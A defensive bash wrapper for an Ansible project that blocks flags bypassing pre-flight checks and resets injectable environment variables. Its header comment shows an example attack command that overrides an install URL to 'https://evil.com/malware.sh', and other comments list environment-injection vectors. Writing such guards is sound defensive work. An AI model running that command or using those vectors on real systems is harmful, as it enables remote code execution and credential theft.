#!/usr/bin/env bash
# SECURITY: Reject --start-at-task flag and other dangerous ansible-playbook flags
# to prevent bypassing pre-flight validation checks.
#
# Vulnerability: Ansible's --start-at-task skips pre_tasks (even with tags: [always]),
# allowing an attacker to bypass validation by running:
#   ansible-playbook site.yml --start-at-task '<task-name>' -e 'claude_install_url=https://evil.com/malware.sh'
#
# Defense-in-depth layers:
#   1. Makefile VERIFY_AND_RUN calls this script (Makefile layer — blocks direct users)
#   2. site.yml Play 0 has tags: [always] with pre-flight checks (Ansible layer)
#   3. site.yml Play 2 re-runs pre-flight checks (Ansible layer — survives --skip-tags always)
#   4. roles/claude/tasks/main.yml has no-tag defense-in-depth assertion (role layer)

set -euo pipefail

# Collect all command-line arguments after the script name
args=("$@")

# Reject specific dangerous flags only
# NOTE: --tags and --skip-tags are NOT blocked globally — they're needed for role-specific
# make targets (make claude, make system, etc.). Only --start-at-task and --skip-tags always
# are blocked, as they specifically bypass pre-flight security checks.
for arg in "${args[@]}"; do
    # Block --start-at-task: skips pre_tasks entirely, bypassing all Play 0 security checks
    if [[ "$arg" == '--start-at-task' || "$arg" == --start-at-task=* || "$arg" == '--start-task' ]]; then
        cat >&2 <<EOF
ERROR: --start-at-task rejected by VERIFY_AND_RUN
Reason: --start-at-task skips pre_tasks (even with tags: [always] on Play 0),
        allowing bypass of ALL 83+ security assertions in pre_flight_checks.yml.

SECURITY RISK: Enables attacker to inject malicious values via -e without validation.
Solution: Use a scoped make target instead (make claude, make packages, make ssh, etc.)
EOF
        exit 1
    fi
    # Block --skip-tags=always (single-arg form with =)
    if [[ "$arg" == '--skip-tags=always' ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags=always rejected by VERIFY_AND_RUN
Reason: --skip-tags always skips Play 0 entirely, bypassing collection verification
        and all security assertions tagged [always] in pre_flight_checks.yml.
Solution: Do not use --skip-tags always with site.yml.
EOF
        exit 1
    fi
done

# Check for space-separated --skip-tags always (two separate args: --skip-tags <value>)
# This requires scanning consecutive arg pairs since the loop above only sees individual args.
for ((i=0; i<${#args[@]}-1; i++)); do
    if [[ "${args[$i]}" == '--skip-tags' && "${args[$((i+1))]}" == 'always' ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags always rejected by VERIFY_AND_RUN
Reason: --skip-tags always skips Play 0 entirely, bypassing collection verification
        and all security assertions tagged [always] in pre_flight_checks.yml.
Solution: Do not use --skip-tags always with site.yml.
EOF
        exit 1
    fi
done

# Override or clear critical env vars to prevent environment-injection attacks.
# Covers eight vectors — SET known-safe values; UNSET those that must be clean:
#   ANSIBLE_CONFIG              — evil cfg replaces all plugin paths + vault_password_file
#   ANSIBLE_VAULT_PASSWORD_FILE — redirects vault decryption to an exfiltration script
#   ANSIBLE_COLLECTIONS_PATH    — loads malicious collections (role 0 code execution)
#   ANSIBLE_ROLES_PATH          — loads malicious roles (arbitrary become code execution)
#   ANSIBLE_ACTION_PLUGINS      — action plugins run for every task; malicious = full intercept
#   ANSIBLE_STRATEGY_PLUGINS    — strategy plugin controls task dispatch; malicious = intercept all
#   PYTHONPATH                  — injected module shadows ansible.* at Python import time (CRITICAL)
#   ANSIBLE_PYTHON_INTERPRETER  — redirects Python used by Ansible to attacker binary
_repo_root="$(cd "$(dirname "$0")/.." && pwd)"
export ANSIBLE_CONFIG="${_repo_root}/ansible.cfg"
export ANSIBLE_VAULT_PASSWORD_FILE="${_repo_root}/scripts/vault-pass.sh"
export ANSIBLE_COLLECTIONS_PATH="${_repo_root}/collections:${HOME}/.ansible/collections:/usr/share/ansible/collections"
export ANSIBLE_ROLES_PATH="${_repo_root}/roles:${HOME}/.ansible/roles:/etc/ansible/roles"
export ANSIBLE_ACTION_PLUGINS="${_repo_root}/action_plugins"
export ANSIBLE_STRATEGY_PLUGINS="${_repo_root}/strategy_plugins"
unset PYTHONPATH          # attacker-set PYTHONPATH can shadow ansible.* modules at import time
unset ANSIBLE_PYTHON_INTERPRETER  # attacker-controlled interpreter runs arbitrary code as Ansible

# Verify collections integrity (defense-in-depth: supply chain verification)
"${_repo_root}/scripts/verify-collections.sh"

# All checks passed — exec the remaining arguments (ansible-playbook or molecule with its args).
# Using exec replaces this script's process with the command, preserving exit codes and
# signals. The Makefile uses: scripts/verify-ansible-args.sh ansible-playbook site.yml ...
# which passes the full command as $@.
if [[ ${#args[@]} -gt 0 ]]; then
    exec "${args[@]}"
fi
